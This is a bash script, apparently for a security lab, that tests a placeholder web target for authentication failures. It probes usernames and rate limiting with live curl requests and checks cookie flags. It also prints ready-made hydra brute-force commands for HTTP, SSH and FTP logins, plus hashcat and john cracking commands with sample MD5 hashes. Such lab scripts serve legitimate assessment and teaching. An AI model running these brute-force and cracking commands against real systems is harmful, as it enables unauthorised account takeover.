#!/bin/bash
# ============================================================
# A07:2021 — Identification & Authentication Failures
# Kali Linux Attack & Analysis Script
# ============================================================
# Tools used: hydra, john, hashcat, curl, python3
# Usage: bash a07_auth_failures.sh
# ============================================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

TARGET="http://TARGET_IP_OR_DOMAIN"
TARGET_HOST=$(echo "$TARGET" | sed 's|https\?://||' | cut -d':' -f1 | cut -d'/' -f1)
TARGET_PORT=$(echo "$TARGET" | grep -oP ':\K[0-9]+' || echo "80")
WORDLIST="/usr/share/wordlists/rockyou.txt"
USERS_LIST="/usr/share/wordlists/metasploit/unix_users.txt"

echo -e "${CYAN}${BOLD}"
echo "╔══════════════════════════════════════════════════╗"
echo "║  A07:2021 — Authentication Failures Lab         ║"
echo "╚══════════════════════════════════════════════════╝${NC}"
echo ""

# ─────────────────────────────────────────────
# SECTION 1: Username Enumeration
# ─────────────────────────────────────────────
echo -e "${BOLD}[1] Username Enumeration${NC}"
echo -e "${YELLOW}    Detecting differences in response for valid vs. invalid usernames${NC}"
echo ""

LOGIN_URL="$TARGET/login"
VALID_INDICATORS=("Invalid password" "Wrong password" "Incorrect password" "Password mismatch")
INVALID_INDICATORS=("User not found" "No such user" "Username does not exist" "Unknown user")

TEST_USERS=("admin" "administrator" "root" "user" "test" "guest" "support" "info" "contact" "nobody")

echo -e "    ${CYAN}Testing login endpoint: $LOGIN_URL${NC}"
echo -e "    ${CYAN}Method: Comparing response content/length for different usernames${NC}"
echo ""

BASELINE=$(curl -s --max-time 10 \
  -X POST \
  -d "username=NONEXISTENT_USER_XYZ123&password=wrongpass" \
  "$LOGIN_URL" 2>/dev/null | wc -c)

echo -e "    Baseline response size (invalid user): ${BASELINE} bytes"
echo ""

for user in "${TEST_USERS[@]}"; do
  RESPONSE=$(curl -s --max-time 10 \
    -X POST \
    -d "username=${user}&password=wrongpass" \
    "$LOGIN_URL" 2>/dev/null)
  SIZE=$(echo "$RESPONSE" | wc -c)
  DIFF=$((SIZE - BASELINE))

  if [ "$DIFF" -gt "20" ] || [ "$DIFF" -lt "-20" ]; then
    echo -e "    ${RED}[DIFFERENT SIZE!]${NC} username='$user' → ${SIZE} bytes (diff: ${DIFF}) — may exist!"
  else
    echo -e "    [SAME SIZE]      username='$user' → ${SIZE} bytes"
  fi

  # Also check for explicit user-not-found messages
  for indicator in "${INVALID_INDICATORS[@]}"; do
    if echo "$RESPONSE" | grep -qi "$indicator"; then
      echo -e "    ${RED}  → Response contains: '$indicator' — username enumeration via error message!${NC}"
    fi
  done
done

echo ""
echo -e "    ${YELLOW}[TIP] Use Burp Intruder with response grep to enumerate usernames at scale.${NC}"
echo ""

# ─────────────────────────────────────────────
# SECTION 2: Brute Force — Hydra
# ─────────────────────────────────────────────
echo -e "${BOLD}[2] HTTP Login Brute Force (Hydra)${NC}"
echo -e "${YELLOW}    Testing authentication endpoints for rate limiting and lockout policies${NC}"
echo ""

echo -e "    ${CYAN}[2a] HTTP POST form brute force:${NC}"
echo -e "    ${BOLD}hydra -l admin -P $WORDLIST \\${NC}"
echo -e "    ${BOLD}  $TARGET_HOST http-post-form \\${NC}"
echo -e "    ${BOLD}  \"/login:username=^USER^&password=^PASS^:Invalid credentials\" \\${NC}"
echo -e "    ${BOLD}  -V -t 10 -I${NC}"
echo ""

echo -e "    ${CYAN}[2b] HTTP Basic Auth brute force:${NC}"
echo -e "    ${BOLD}hydra -l admin -P $WORDLIST $TARGET_HOST http-get /admin/ -V${NC}"
echo ""

echo -e "    ${CYAN}[2c] SSH brute force (if port 22 is open):${NC}"
echo -e "    ${BOLD}hydra -l root -P $WORDLIST ssh://$TARGET_HOST -V -t 4${NC}"
echo ""

echo -e "    ${CYAN}[2d] FTP brute force (if port 21 is open):${NC}"
echo -e "    ${BOLD}hydra -l admin -P $WORDLIST ftp://$TARGET_HOST -V${NC}"
echo ""

# Quick rate limiting test
echo -e "    ${CYAN}[2e] Rate limiting check — sending 10 rapid failed login attempts:${NC}"
echo ""
FAILED_COUNTER=0
BLOCKED=false
for i in $(seq 1 10); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 \
    -X POST \
    -d "username=admin&password=wrongpassword${i}" \
    "$LOGIN_URL" 2>/dev/null)

  if [ "$STATUS" == "429" ]; then
    echo -e "    ${GREEN}[RATE LIMITED!]${NC} Got HTTP 429 on attempt $i — rate limiting is active!"
    BLOCKED=true
    break
  elif [ "$STATUS" == "200" ] || [ "$STATUS" == "302" ]; then
    FAILED_COUNTER=$((FAILED_COUNTER + 1))
    echo -e "    Attempt $i: HTTP $STATUS — no throttling yet"
  else
    echo -e "    Attempt $i: HTTP $STATUS"
  fi
done

if [ "$BLOCKED" = false ]; then
  echo -e "    ${RED}[NO RATE LIMIT]${NC} All $FAILED_COUNTER attempts processed without throttling!"
  echo -e "    ${RED}               Application is vulnerable to brute force.${NC}"
fi
echo ""

# ─────────────────────────────────────────────
# SECTION 3: Password Hash Cracking
# ─────────────────────────────────────────────
echo -e "${BOLD}[3] Offline Password Cracking (John / Hashcat)${NC}"
echo -e "${YELLOW}    Cracking captured password hashes from database dumps${NC}"
echo ""

mkdir -p /tmp/a07_demo

cat > /tmp/a07_demo/test_hashes.txt << 'EOF'
# MD5 hashes (hashcat mode -m 0 / john --format=raw-md5)
5f4dcc3b5aa765d61d8327deb882cf99  # password
e10adc3949ba59abbe56e057f20f883e  # 123456
25f9e794323b453885f5181f1b624d0b  # 123456789
d8578edf8458ce06fbc5bb76a58c5ca4  # qwerty
EOF

echo -e "    ${CYAN}[3a] Identify hash type (hash-identifier):${NC}"
echo -e "    ${BOLD}hash-identifier 5f4dcc3b5aa765d61d8327deb882cf99${NC}"
echo -e "    ${BOLD}hashid 5f4dcc3b5aa765d61d8327deb882cf99${NC}"
echo ""

echo -e "    ${CYAN}[3b] Crack MD5 hashes:${NC}"
echo -e "    ${BOLD}hashcat -m 0 -a 0 /tmp/a07_demo/test_hashes.txt $WORDLIST --force${NC}"
echo -e "    ${BOLD}john --format=raw-md5 --wordlist=$WORDLIST /tmp/a07_demo/test_hashes.txt${NC}"
echo ""

echo -e "    ${CYAN}[3c] Crack SHA-1 hashes:${NC}"
echo -e "    ${BOLD}hashcat -m 100 -a 0 hashes.txt $WORDLIST --force${NC}"
echo ""

echo -e "    ${CYAN}[3d] Crack bcrypt hashes (much slower — expected!):${NC}"
echo -e "    ${BOLD}hashcat -m 3200 -a 0 bcrypt_hashes.txt $WORDLIST --force${NC}"
echo -e "    ${BOLD}john --format=bcrypt --wordlist=$WORDLIST bcrypt_hashes.txt${NC}"
echo ""

echo -e "    ${CYAN}[3e] Crack NTLM hashes (Windows/Active Directory):${NC}"
echo -e "    ${BOLD}hashcat -m 1000 -a 0 ntlm_hashes.txt $WORDLIST --force${NC}"
echo ""

echo -e "    ${CYAN}[3f] Rules-based attack (mutate wordlist):${NC}"
echo -e "    ${BOLD}hashcat -m 0 -a 0 hashes.txt $WORDLIST -r /usr/share/hashcat/rules/best64.rule --force${NC}"
echo ""

echo -e "    ${CYAN}[3g] Mask attack (brute force specific pattern — e.g. 8-char, upper+lower+digit):${NC}"
echo -e "    ${BOLD}hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?d?d?d?d --force${NC}"
echo ""

# ─────────────────────────────────────────────
# SECTION 4: Session Token Analysis
# ─────────────────────────────────────────────
echo -e "${BOLD}[4] Session Token Analysis${NC}"
echo -e "${YELLOW}    Checking cookies for security flags and predictability${NC}"
echo ""

echo -e "    ${CYAN}Fetching cookies from $TARGET...${NC}"
COOKIE_HEADER=$(curl -s -I --max-time 10 -c /tmp/a07_demo/cookies.txt "$TARGET/login" 2>/dev/null | grep -i "Set-Cookie")

if [ -n "$COOKIE_HEADER" ]; then
  echo -e ""
  echo -e "    Raw Set-Cookie headers:"
  echo "$COOKIE_HEADER" | while IFS= read -r line; do
    echo -e "    $line"
  done
  echo ""

  check_flag() {
    local header="$1"
    local flag="$2"
    if echo "$header" | grep -qi "$flag"; then
      echo -e "    ${GREEN}[✓]${NC} $flag"
    else
      echo -e "    ${RED}[✗]${NC} $flag — MISSING!"
    fi
  }

  echo -e "    ${CYAN}Cookie security flags:${NC}"
  check_flag "$COOKIE_HEADER" "HttpOnly"
  check_flag "$COOKIE_HEADER" "Secure"
  check_flag "$COOKIE_HEADER" "SameSite"

  SESSION_COOKIE=$(echo "$COOKIE_HEADER" | grep -i "PHPSESSID\|session\|token\|auth" | head -1 | grep -oP '=\K[^;]+' | head -1)
  if [ -n "$SESSION_COOKIE" ]; then
    echo -e ""
    echo -e "    ${CYAN}Session token value: ${BOLD}$SESSION_COOKIE${NC}"
    echo -e "    Token length: ${#SESSION_COOKIE} characters"
    if [ ${#SESSION_COOKIE} -lt 16 ]; then
      echo -e "    ${RED}[WEAK]${NC} Token is very short — may be predictable!"
    else
      echo -e "    ${GREEN}[OK]${NC}   Token length appears adequate"
    fi
  fi
else
  echo -e "    ${YELLOW}[!] No Set-Cookie headers found. Target may not be setting cookies.${NC}"
fi
echo ""

echo -e "${CYAN}${BOLD}[A07 Complete]${NC} Document brute force results, hash crack times, and cookie weaknesses."
echo ""
